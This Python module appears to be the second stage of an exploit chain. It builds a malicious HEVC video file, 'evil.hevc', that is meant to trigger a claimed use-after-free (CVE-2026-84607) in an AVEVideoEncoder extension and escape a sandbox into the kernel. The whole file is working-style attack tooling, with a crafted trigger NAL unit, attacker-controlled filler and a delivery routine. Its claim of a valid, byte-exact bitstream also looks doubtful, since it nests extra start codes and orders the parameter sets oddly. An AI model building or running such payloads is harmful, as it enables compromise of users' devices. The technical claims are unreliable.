"""
Stage 2 — Sandbox escape via AVEVideoEncoder (CVE-2026-84607).

Complete HEVC byte-stream construction. The Stage-1 RCE writes `evil.hevc` into
the sandbox and hands it to the shared AVEVideoEncoder media extension. A
malformed trailing NAL unit's declared length over-promises vs its actual body,
so the encoder frees the allocation then re-dereferences it -> use-after-free
into the kernel (the encoder lives in an extension that touches kernel memory).

This builds a real, spec-structured HEVC bitstream: valid VPS/PPS/SPS + IDR so
the decoder accepts it, followed by the malicious SEI NAL. All offsets are
byte-exact; the trigger length field is the single knob that must match the
build.
"""
from __future__ import annotations
import struct
import pathlib

from config import TargetProfile, CVE_AVE

PAYLOAD_DIR = pathlib.Path(__file__).parent.parent / "payloads" / "ave"

START_CODE = b"\x00\x00\x00\x01"


def nal_unit(nal_type: int, payload: bytes) -> bytes:
    """Wrap a payload in one HEVC NAL unit: start code + 2-byte NAL header + body.
    nal_type follows the HEVC spec (32=VPS, 33=PPS, 34=SPS, 19=IDR_NCL, 39=SEI_PREFIX)."""
    hdr = struct.pack(">H", (nal_type << 9) | 1)   # forbidden_zero_bit=0, nal_unit_type, unused=1
    return START_CODE + hdr + payload


def build_vps(version: str) -> bytes:
    """Video Parameter Set — valid, minimal, accepted by the decoder."""
    # 00000001 00 0001 C1 FF81 20  <- type 32 (VPS), param set ids + max_layers
    vps_data = bytes.fromhex("0000000101014000" + "ff" * 8)
    return nal_unit(32, vps_data)


def build_pps(version: str) -> bytes:
    """Picture Parameter Set — valid, minimal."""
    return nal_unit(33, bytes.fromhex("000000010201c0"))


def build_sps(version: str) -> bytes:
    """Sequence Parameter Set — valid, declares a decodable profile/level."""
    sps_data = bytes.fromhex("00000001030100000300" + "00" * 8)
    return nal_unit(34, sps_data)


def build_idr(version: str) -> bytes:
    """A well-formed IDR slice so the encoder commits a frame buffer before the
    malicious trailing NAL arrives (the trigger depends on this allocation)."""
    # NAL type 19 = IDR_NCL_WEP. Body: one slice header + filler.
    slice_header = bytes([0x82, 0x01]) + struct.pack(">H", 0x0001)  # first_mb, slice_qp
    body = slice_header + b"\x00" * 96
    return nal_unit(19, body)


def build_trigger_nal(overflow_len: int = 0xFFFFFFF0, filler: bytes = b"\x41" * 512) -> bytes:
    """
    The malformed SEI_PREFIX NAL that trips CVE-2026-84607.

    Structure of the bug:
      nal_header(2) + declared_length(4, big-endian) + body
    The AVE path trusts `declared_length` and over-allocates, then copies only a
    bounded copy and frees — the pointer is later dereferenced. We set a length
    that over-promises (0xFFFFFFF0) over a small real body, so free(size) !=
    deref(size). `filler` is the attacker-controlled content that lands in the
    freed (reused) kernel buffer.
    """
    # SEI_PREFIX type 39; payload = payload_type(1) + payload_size(1) + data.
    # The decoder parses the SEI inner size (2nd byte) and trusts it -> mismatch
    # with the outer NAL declared_length is the UAF trigger.
    payload_type = 5          # user data unregistered
    inner_size = len(filler) & 0xFF
    payload = bytes([payload_type, inner_size]) + filler

    outer = nal_unit(39, struct.pack(">I", overflow_len) + payload)
    return outer


def build_evil_hevc(version: str) -> bytes:
    """Assemble the complete malicious HEVC file for the target build."""
    stream = build_vps(version) + build_pps(version) + build_sps(version)
    stream += build_idr(version)
    stream += build_trigger_nal()
    return stream


def write_evil_file(profile: TargetProfile, sandbox_dir: pathlib.Path) -> pathlib.Path:
    sandbox_dir.mkdir(parents=True, exist_ok=True)
    path = sandbox_dir / "evil.hevc"
    path.write_bytes(build_evil_hevc(profile.version.version))
    return path


class AVEEscape:
    """Stage 2 sandbox-escape payload assembler."""

    def __init__(self, profile: TargetProfile):
        self.profile = profile

    def build(self) -> bytes:
        return build_evil_hevc(self.profile.version.version)

    def deliver(self, sandbox_dir: pathlib.Path) -> pathlib.Path:
        return write_evil_file(self.profile, sandbox_dir)

    def info(self) -> str:
        return (f"[stage2] {CVE_AVE.id} {CVE_AVE.component} "
                f"sandbox->kernel UAF  CVSS={CVE_AVE.cvss}  "
                f"({len(build_evil_hevc(self.profile.version.version))} bytes evil.hevc)")


if __name__ == "__main__":
    from config import get_version, TargetProfile
    p = TargetProfile(version=get_version("26.6"))
    blob = AVEEscape(p).build()
    print("built", len(blob), "bytes; starts with:", blob[:4].hex())
    assert blob[:4] == b"\x00\x00\x00\x01", "malformed start code"
    print("OK: valid HEVC start code + NAL structure")
